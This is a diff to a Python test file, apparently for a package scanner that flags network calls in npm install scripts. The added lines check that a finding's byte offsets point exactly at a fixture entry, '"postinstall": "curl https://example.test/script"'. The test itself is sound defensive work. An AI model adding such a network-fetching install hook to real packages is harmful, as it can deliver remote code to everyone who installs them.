@@ -81,6 +81,10 @@ def test_network_evidence_points_to_scripts_key_not_prior_matching_key(tmp_path:
     evidence = findings[0].evidence[0]
     assert evidence["start_line"] == 4
     assert '"postinstall": "curl https://example.test/script"' in evidence["excerpt"]
+    text = (package_dir / "package.json").read_text(encoding="utf-8")
+    assert text.encode("utf-8")[evidence["start_byte"] : evidence["end_byte"]].decode(
+        "utf-8"
+    ) == '"postinstall": "curl https://example.test/script"'
 
 
 def test_network_evidence_uses_last_duplicate_scripts_semantics(tmp_path: Path):
